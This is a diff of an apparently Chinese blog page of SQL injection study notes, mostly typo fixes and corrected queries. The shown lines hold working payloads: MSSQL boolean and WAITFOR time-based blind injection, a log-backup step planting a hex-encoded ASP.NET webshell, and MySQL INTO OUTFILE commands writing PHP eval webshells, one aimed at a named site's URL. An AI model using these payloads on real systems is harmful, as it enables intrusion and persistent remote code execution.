@@ -353,7 +353,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-19 22:02:07" itemprop="dateModified" datetime="2020-02-19T22:02:07+08:00">2020-02-19</time>
+                <time title="修改时间：2020-08-12 21:13:17" itemprop="dateModified" datetime="2020-08-12T21:13:17+08:00">2020-08-12</time>
               </span>
 
           
@@ -470,7 +470,7 @@
 <ul>
 <li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=109)</code></li>
 <li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,2,1))=111)</code></li>
-<li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=111 and name not in (&#39;mozhe_db_v2.dbo.sysobjects&#39;))</code></li>
+<li><code>and exists(select top 1 name from Master..SysDatabases where unicode(substring(name,1,1))=111 and name not in (&#39;mozhe_db_v2&#39;))</code></li>
 </ul>
 </li>
 </ul>
@@ -504,7 +504,7 @@
 <li><a href="http://www.r0bots.cc/index.php/2019/10/31/186.html" target="_blank" rel="noopener">相关资料2</a></li>
 </ul>
 <h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
-<li>延时函数：WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作用就是等待特定时间，然后继续执行后续的语句。它包含一个参数DELAY，用来指定等待的时间。如果将该语句成功注入后，会造成数据库返回记录和Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注入漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测方法。如：<code>WAITFOR DELAY &#39;0:0:4&#39;</code> – 表⽰延迟4秒。</li>
+<li>延时函数：WAITFOR是SQL Server中Transact-SQL提供的一个流程控制语句。它的作用就是等待特定时间，然后继续执行后续的语句。它包含一个参数DELAY，用来指定等待的时间。如果将该语句成功注入后，会造成数据库返回记录和Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注入漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测方法。如：<code>WAITFOR DELAY &#39;0:0:4&#39;</code> – 表示延迟4秒。</li>
 <li>IF exists ()子句：<code>IF exists () WAITFOR DELAY &#39;0:0:5&#39;</code></li>
 </ul>
 <h2 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h2><ol>
@@ -517,7 +517,7 @@
 </ul>
 </li>
 <li>猜表名<ul>
-<li><code>IF exists (select top 1 name from syscolumns where id =(select id from sysobjects where name = &#39;表名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
+<li><code>IF exists (select top 1 name from sysobjects where id =(select id from sysdatabases where name = &#39;库名&#39;) and unicode(substring(name,1,1))=117) WAITFOR DELAY &#39;0:0:5&#39;--</code></li>
 </ul>
 </li>
 <li>猜列名<ul>
@@ -619,7 +619,7 @@
 <li><p>log备份getshell</p>
 <ul>
 <li><code>;alter database test set RECOVERY FULL--</code> 设置数据库test为recover模式</li>
-<li><code>;create table cmd --</code>  删除同名表</li>
+<li><code>;drop table cmd --</code>  删除同名表</li>
 <li><code>;create table cmd (a image)--</code>  创建表，字段名是a，类型是image</li>
 <li><code>;backup log test to disk = &#39;c:/x.bak&#39; with init--</code> 进行log备份</li>
 <li><code>;insert into cmd (a) values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e)--</code> 插入一句话到字段a里</li>
@@ -702,7 +702,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-18 16:05:34" itemprop="dateModified" datetime="2020-02-18T16:05:34+08:00">2020-02-18</time>
+                <time title="修改时间：2020-03-26 22:13:08" itemprop="dateModified" datetime="2020-03-26T22:13:08+08:00">2020-03-26</time>
               </span>
 
           
@@ -871,7 +871,7 @@
 </li>
 <li><p>写文件</p>
 <ul>
-<li><p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换⾏符</p>
+<li><p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符</p>
 </li>
 <li><p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p>
 </li>
@@ -881,14 +881,14 @@
 </li>
 <li><p><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;</code></p>
 </li>
-<li><p>LINES STARTING BY ‘写⼊的内容’：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</p>
+<li><p>LINES STARTING BY ‘写⼊的内容’：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</p>
 </li>
-<li><p>LINES TERMINATED BY ‘写⼊的内容’：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
+<li><p>LINES TERMINATED BY ‘写⼊的内容’：设置每行数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
 </li>
 </ul>
 </li>
 </ol>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><code>http://www.dark5.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; -- a</code></p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><code>http://www.dark5.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; --</code></p>
 <h2 id="GPC的问题"><a href="#GPC的问题" class="headerlink" title="GPC的问题"></a>GPC的问题</h2><p>PHP开启GPC以后，会把接收的字符加上反斜杠转义。</p>
 
       
